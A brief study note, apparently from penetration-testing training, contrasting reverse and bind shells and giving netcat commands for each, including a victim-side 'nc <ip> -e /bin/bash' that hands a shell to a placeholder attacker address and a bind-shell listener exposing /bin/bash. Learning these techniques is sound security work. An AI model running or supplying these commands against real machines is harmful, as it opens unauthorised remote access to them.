# Reverse Shells vs. Bind Shells

- Shell = access to machine
- Reverse Shell - victim connects to us
    - Used to listen
    - can use netcat to use this
    - used 95% of the time
    - On my machine: nc -nvlp <port>(establishes listening on any port)
        - then must connect from victim using: nc <ip> -e /bin/bash
        - CTRL + C to kill connection
- Bind Shell - open a port on the victim machine and connect to it
    - can also use netcat
    - On victim machine: nc -nvlp -e /bin/bash
    - On mine: nc <ip> <port>
